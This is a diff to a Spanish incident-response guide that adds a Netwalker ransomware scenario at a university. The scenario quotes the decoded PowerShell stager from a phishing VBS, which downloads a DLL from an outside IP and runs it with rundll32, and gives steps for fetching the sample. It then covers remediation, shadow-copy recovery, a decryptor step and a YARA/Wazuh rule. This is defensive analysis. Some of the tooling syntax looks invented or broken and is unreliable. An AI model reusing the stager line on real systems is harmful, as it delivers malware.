@@ -184,8 +184,108 @@ Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=empresa,DC=local"
 
 ---
 
-## 🎯 Goal
-Se optó por una arquitectura de herencia orientada a objetos donde una clase base centraliza las técnicas comunes (TTPs transversales a todas las familias) y cada familia sobreescribe únicamente los métodos con comportamiento distintivo. Esto permite añadir nuevas familias sin modificar el núcleo del framework, reduciendo el riesgo de regresiones y facilitando el mantenimiento.
+## 🎯 Netwalker - Universidad con ataque vía phishing VBS
+
+Escenario: Profesor abre "Factura_Matricula.vbs" de un correo que parecía de administración. A las 2 horas, todo el servidor de investigación tiene archivos .mailto[admin@cock.li].
+
+Paso 1: Análisis del VBS malicioso (obtenido del email original)
+
+```bash
+# El archivo Factura_Matricula.vbs contiene:
+# Execute("p"+"o"+"w"+"e"+"r"+"s"+"h"+"e"+"l"+"l -w 1 -enc JABhAD0AKA...")
+
+# Decodificar el Base64 de PowerShell en Kali
+echo "JABhAD0AKA..." | base64 -d
+# Revela: $a=(New-Object Net.WebClient).DownloadFile('hxxp://103.208.86.149/k.png','C:\ProgramData\update.dll');rundll32 C:\ProgramData\update.dll,Main
+
+# Obtener muestra del payload para analizar
+wget hxxp://103.208.86.149/k.png -O muestra_netwalker.dll
+file muestra_netwalker.dll
+# PE32+ executable (DLL) x86-64, for MS Windows
+```
+
+Paso 2: Script para detener cifrado en múltiples endpoints con WMI
+
+```powershell
+# PowerShell desde máquina del SOC
+$machines = Get-Content .\maquinas_comprometidas.txt
+
+foreach($pc in $machines) {
+    # Matar proceso que está cifrando
+    Invoke-Command -ComputerName $pc -ScriptBlock {
+        Get-Process | Where-Object {$_.Modules.FileName -like "*ProgramData*"} | Stop-Process -Force
+    }
+    
+    # Bloquear tráfico saliente al C2 en el firewall local
+    Invoke-Command -ComputerName $pc -ScriptBlock {
+        New-NetFirewallRule -DisplayName "Block_Netwalker" -Direction Outbound -RemotePort 443 -Protocol TCP -Action Block
+    }
+}
+```
+
+Paso 3: Recuperar Shadow Copies (si no las eliminó)
+
+```bash
+# Netwalker intenta borrar VSS, pero a veces falla
+# En el servidor de investigación:
+vssadmin list shadows
+
+# Si hay sombras disponibles:
+vssadmin list shadows /for=D:
+# Sombra de copia: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
+
+# Crear symlink para acceder
+mklink /D C:\shadow_copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\
+
+# Copiar datos no cifrados
+robocopy C:\shadow_copy\datos_investigacion D:\recuperado /E /COPYALL
+```
+
+Paso 4: Descifrar usando herramienta pública (si existe para la variante)
+
+```bash
+# Verificar tipo exacto de Netwalker
+# Del archivo de nota de rescate, extraer ID de víctima
+cat CLH*.txt | findstr "personal ID"
+# ID: 9a8f7b6c5d4e3f2a
+
+# Buscar decryptor en repositorios
+# Emsisoft suele publicar para variantes específicas
+wget https://www.emsisoft.com/en/ransomware-decryption/netwalker/
+# Ejecutar decryptor en modo offline en la VM aislada
+NetwalkerDecryptor.exe -id 9a8f7b6c5d4e3f2a -path D:\datos_cifrados
+```
+
+Paso 5: Regla YARA para evitar reinfección en endpoint protection
+
+```yara
+rule Netwalker_Mailto_Detection {
+    meta:
+        description = "Detecta Netwalker en endpoints"
+        author = "SOC Team"
+        
+    strings:
+        $ransom_note = "---= NETWALKER =---" ascii wide
+        $extension = ".mailto" ascii wide
+        $mutex = "Global\NetWalker" wide
+        $c2_pattern = { 68 00 74 00 74 00 70 00 73 00 3A 00 2F 00 2F } // h.t.t.p.s.:././.
+        
+    condition:
+        (uint16(0) == 0x5A4D) and (any of them)
+}
+```
+
+```bash
+# Desplegar con Wazuh Agent
+# En /var/ossec/etc/shared/default/agent.conf:
+<agent_config>
+  <localfile>
+    <yara rule="netwalker_detect.yar">
+      <command>file -f %path%</command>
+    </yara>
+  </localfile>
+</agent_config>
+```
 
 ---
 
